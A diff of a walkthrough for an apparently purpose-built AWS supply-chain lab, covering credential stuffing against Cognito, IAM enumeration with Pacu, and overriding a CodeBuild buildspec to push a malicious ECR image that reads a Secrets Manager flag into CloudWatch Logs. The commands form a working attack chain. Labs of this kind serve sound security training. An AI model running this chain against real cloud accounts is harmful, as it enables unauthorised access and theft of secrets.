@@ -11,37 +11,88 @@ The web portal (Step 1) is browser-only for reconnaissance — no direct interac
 
 ## Step 1: Reconnaissance
 
-Access the developer portal and gather information.
-
 ```bash
 cd scenarios/aws/03-supply-chain/dam-breaks/terraform
 terraform output scenario_entrypoint_url
 ```
 
-Open the URL in your browser to see the **BeaverPay Developer Portal**.
+Open the URL in your browser. The **BeaverPay Developer Portal** appears — a B2B collaborator portal.
 
 ![BeaverPay Developer Portal](./assets/images/portal-homepage.png)
 
-Key observations:
-- Auth Endpoint: `cognito-idp.us-east-1.amazonaws.com`
-- Auth Flow: `USER_PASSWORD_AUTH`
-- MFA: `Optional`
-- Resources: AWS CodeBuild, ECR, ECS Fargate
+The page has two information cards visible without logging in. The **Access Information** card exposes the authentication configuration directly:
+
+| Field | Value |
+|-------|-------|
+| Auth Endpoint | `cognito-idp.us-east-1.amazonaws.com` |
+| Auth Flow | `USER_PASSWORD_AUTH` |
+| MFA | `Optional` |
+
+Key findings:
+- **Auth Flow: `USER_PASSWORD_AUTH`** — username/password directly against Cognito, no challenge-response
+- **MFA: Optional** — not enforced → credential stuffing succeeds with no second factor
+- **Collaborator Resources card** — lists CodeBuild, ECR, ECS Fargate → confirms what services are in scope
+
+The `/config` endpoint provides the Cognito IDs needed for the API calls:
+
+```bash
+curl -s http://<portal-ip>/config | python3 -m json.tool
+```
+
+Output:
+```json
+{
+  "clientId": "xxxxxxxxxxxxxxxxxxxxxxxxxx",
+  "poolId": "us-east-1_xxxxxxxxx",
+  "identityPoolId": "us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
+  "accountId": "123456789012",
+  "region": "us-east-1"
+}
+```
 
 ---
 
 ## Step 2: Cognito Authentication
 
-### Step 2-1: Log in via the Developer Portal
+### Step 2-1: Credential Stuffing
 
-Open the portal URL in your browser. Enter the leaked collaborator credentials:
+`USER_PASSWORD_AUTH` with MFA set to Optional (not enforced) means any valid username/password pair authenticates immediately — no second factor, no adaptive challenge. This is the prerequisite for credential stuffing.
+
+The target domain is `ottercode.kr`. Test known breached credentials against the Cognito endpoint:
+
+```bash
+aws cognito-idp initiate-auth \
+  --auth-flow USER_PASSWORD_AUTH \
+  --client-id "<clientId from /config>" \
+  --auth-parameters USERNAME=j.park@ottercode.kr,PASSWORD=Otter2022! \
+  --region us-east-1
+```
+
+Output:
+```json
+{
+  "AuthenticationResult": {
+    "AccessToken": "...",
+    "IdToken": "eyJ...",
+    "RefreshToken": "..."
+  }
+}
+```
+
+No MFA challenge. Authentication succeeds on first attempt. `j.park@ottercode.kr` is an active OtterCode collaborator account.
+
+> **Why this works:** Cognito with `USER_PASSWORD_AUTH` and MFA not enforced has no built-in rate limiting by default. Automated credential stuffing against the endpoint is indistinguishable from normal login traffic without Advanced Security Features (ASF) enabled.
+
+### Step 2-2: Log in via the Developer Portal
+
+Open the portal URL in your browser. Enter the credentials:
 
 - Email: `j.park@ottercode.kr`
 - Password: `Otter2022!`
 
 ![BeaverPay Portal Login](./assets/images/portal-login.png)
 
-The portal authenticates against Cognito User Pool using `USER_PASSWORD_AUTH` — no MFA challenge fires because MFA is set to **optional**.
+The portal authenticates against Cognito User Pool using `USER_PASSWORD_AUTH` — no MFA challenge fires because MFA is not enforced.
 
 After login, the dashboard automatically exchanges the Cognito JWT for temporary AWS credentials via the Identity Pool and displays them ready to copy:
 
@@ -54,7 +105,7 @@ export AWS_SESSION_TOKEN="IQoJ..."
 export AWS_DEFAULT_REGION="us-east-1"
 ```
 
-### Step 2-1 (Alternative): CLI-only Authentication
+### Step 2-3 (Alternative): CLI-only Authentication
 
 If browser access is unavailable, obtain Collaborator credentials entirely via CLI.
 
@@ -101,7 +152,7 @@ export AWS_DEFAULT_REGION="us-east-1"
 
 > The portal performs this same sequence client-side. `initiate-auth` authenticates against the User Pool, `get-id` resolves the Identity Pool identity, and `get-credentials-for-identity` exchanges the JWT for temporary AWS credentials via `AssumeRoleWithWebIdentity`.
 
-### Step 2-2: Verify Identity
+### Step 2-4: Verify Identity
 
 ```bash
 aws sts get-caller-identity
@@ -120,7 +171,71 @@ You are now authenticated as `CollaboratorDeveloperRole` — a role with limited
 
 ---
 
-## Step 3: IAM Enumeration with Pacu
+## Step 3: IAM Enumeration
+
+### Step 3-1: Manual enumeration attempts (AWS CLI)
+
+Credentials obtained. First instinct: find out what this role can do.
+
+The ARN from Step 2-4 tells us something immediately:
+
+```
+arn:aws:sts::123456789012:assumed-role/dam-breaks-CollaboratorDeveloperRole-xxxxxxxx/CognitoIdentityCredentials
+```
+
+This is an **assumed-role**, not an IAM user. Common user-based enumeration commands will fail:
+
+```bash
+aws iam get-user
+# Error: Must specify userName when calling with non-User credentials.
+
+aws iam list-user-policies --user-name me
+# Error: NoSuchEntity
+
+aws iam list-attached-user-policies --user-name me
+# Error: NoSuchEntity
+```
+
+The principal is a role assumed via Cognito. Try enumerating the role itself:
+
+```bash
+ROLE_NAME="dam-breaks-CollaboratorDeveloperRole-xxxxxxxx"
+
+aws iam list-role-policies --role-name "$ROLE_NAME"
+# Output: { "policyNames": ["dam-breaks-collaborator-policy-xxxxxxxx"] }
+
+aws iam get-role-policy \
+  --role-name "$ROLE_NAME" \
+  --policy-name "dam-breaks-collaborator-policy-xxxxxxxx"
+```
+
+This returns the full inline policy — but IAM policy documents alone don't tell you what *actually works*. Conditions, SCPs, permission boundaries, and resource-level restrictions can all silently block actions that look allowed on paper.
+
+The real question is: **what can I actually call right now?**
+
+Trial and error with individual services:
+
+```bash
+aws s3 ls
+# An error occurred (AccessDenied)
+
+aws lambda list-functions --region us-east-1
+# An error occurred (AccessDenied)
+
+aws ec2 describe-instances --region us-east-1
+# An error occurred (AccessDenied)
+
+aws codebuild list-projects --region us-east-1
+# { "projects": ["dam-breaks-webapp-qa-build-xxxxxxxx", "dam-breaks-webapp-prod-build-xxxxxxxx"] }
+```
+
+Something works. But manually probing every AWS service and action is not practical — there are hundreds of services and thousands of actions. Miss one and you miss the attack path.
+
+A more systematic approach is needed.
+
+### Step 3-2: IAM Enumeration with Pacu
+
+Pacu's `iam__enum_permissions` module uses `iam:SimulatePrincipalPolicy` — an IAM API that lets any principal test which actions are allowed against which resources, without actually calling them. It's a legitimate IAM feature that attackers abuse for permission discovery.
 
 ```bash
 pacu
@@ -183,11 +298,13 @@ Output:
 [iam__enum_permissions] Pacu data saved: iam__enum_permissions
 ```
 
+The DENIED list is as informative as the ALLOWED list. `ecr:PutImage` is blocked — direct ECR push is not an option. `secretsmanager:GetSecretValue` is blocked — the flag cannot be read directly. But `codebuild:StartBuild` is allowed, and CodeBuild has ECR push permissions via its service role. The attack path is forced through the build pipeline.
+
 ### Why `codebuild:StartBuild` is the critical finding
 
 When Pacu confirms `codebuild:StartBuild` is allowed, the key question is: **is there an IAM Condition restricting which buildspec can be used?**
 
-Use `iam:GetRolePolicy` to inspect the policy directly. Replace `xxxxxxxx` with the 8-character suffix visible in the ARN from Step 2-2.
+Use `iam:GetRolePolicy` to inspect the policy directly. Replace `xxxxxxxx` with the 8-character suffix visible in the ARN from Step 2-4.
 
 ```bash
 aws iam get-role-policy \
@@ -236,6 +353,8 @@ Key findings:
 
 ## Step 4: CodeBuild Reconnaissance
 
+Pacu confirmed `codebuild:StartBuild` with no IAM Condition — `buildspecOverride` is unrestricted. Before crafting a malicious buildspec, map the environment: which projects exist, what environment variables they expose, and which service role they use.
+
 ```bash
 aws codebuild list-projects --region us-east-1
 ```
@@ -280,6 +399,8 @@ Output:
 
 ## Step 5: ECR Reconnaissance
 
+`REPOSITORY_URI` is now known from the CodeBuild environment variables. The attack plan requires pushing a malicious image to this repository. `ecr:PutImage` was denied in Step 3 — a direct push is blocked. The only path to ECR is through CodeBuild, which has its own service role with push permissions. Before writing the buildspec, confirm the tag mutability of the target repository.
+
 ```bash
 aws ecr describe-repositories \
   --region us-east-1 \
@@ -301,6 +422,8 @@ Key findings:
 ---
 
 ## Step 6: ECS Reconnaissance
+
+The ECR tag is `MUTABLE` — overwriting `:latest` is possible. Now confirm the ECS side: will ECS auto-deploy when the image changes, or is there a manual approval gate? And does the Task Role actually have `secretsmanager:GetSecretValue`? A malicious container that deploys but can't read the secret is useless.
 
 ```bash
 aws ecs describe-services \
@@ -332,10 +455,12 @@ arn:aws:iam::123456789012:role/dam-breaks-ecs-task-role-xxxxxxxx
 ```
 
 Key findings:
-- Rolling deployment (`ECS`) — no manual approval gate
-- Circuit breaker disabled — no automatic rollback
-- `latest` tag referenced — image replacement reflected immediately
-- Task Role confirmed — Secrets Manager access expected
+- Rolling deployment (`ECS`) — no manual approval gate, new image deploys automatically
+- Circuit breaker disabled — failed container won't auto-rollback and alert defenders
+- `latest` tag referenced — overwriting ECR `:latest` triggers deployment immediately
+- Task Role confirmed — the malicious container will inherit `secretsmanager:GetSecretValue` automatically via the ECS credential endpoint (`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`)
+
+All prerequisites confirmed. The attack chain is viable end-to-end.
 
 ---
 
@@ -343,7 +468,15 @@ Key findings:
 
 ### Step 7-1: Create malicious buildspec file
 
-The malicious image replaces the legitimate webapp container. Once deployed by ECS, it reads the flag from Secrets Manager using the ECS Task Role and outputs it to stdout — which CloudWatch Logs captures automatically.
+The attack chain is now fully mapped:
+1. `codebuild:StartBuild` + no Condition → buildspec is fully replaceable
+2. CodeBuild service role has ECR push permissions → malicious image can reach ECR
+3. ECR tag is MUTABLE → `:latest` can be overwritten silently
+4. ECS rolling deploy with no approval gate → new image deploys automatically
+5. ECS Task Role has `secretsmanager:GetSecretValue` → container reads the flag on startup
+6. CloudWatch Logs captures stdout → flag is readable via `logs:FilterLogEvents`
+
+The malicious image doesn't need a reverse shell or outbound connection. It only needs to call one AWS API and write the result to stdout.
 
 ```bash
 cat > /tmp/buildspec.json << 'EOF'
@@ -455,9 +588,9 @@ Once `running` equals `desired` and `pending` is 0, the exfiltration container h
 
 ## Step 9: FLAG Extraction via CloudWatch Logs
 
-The ECS task definition specifies CloudWatch Logs as its log driver — all container stdout is forwarded automatically. The Collaborator role has `logs:FilterLogEvents` on `/ecs/*` log groups, which is standard read access for a developer debugging their application.
+The container started, called `secretsmanager:GetSecretValue`, and printed the result to stdout. ECS is configured with CloudWatch Logs as its log driver — every line of stdout is forwarded automatically to `/ecs/<task-definition-name>`. The Collaborator role has `logs:FilterLogEvents` confirmed in Step 3 — this is standard developer read access for debugging, not a suspicious permission on its own.
 
-Replace `xxxxxxxx` with the suffix from Step 2-2.
+Replace `xxxxxxxx` with the suffix from the ARN shown in Step 2-4.
 
 ```bash
 aws logs filter-log-events \
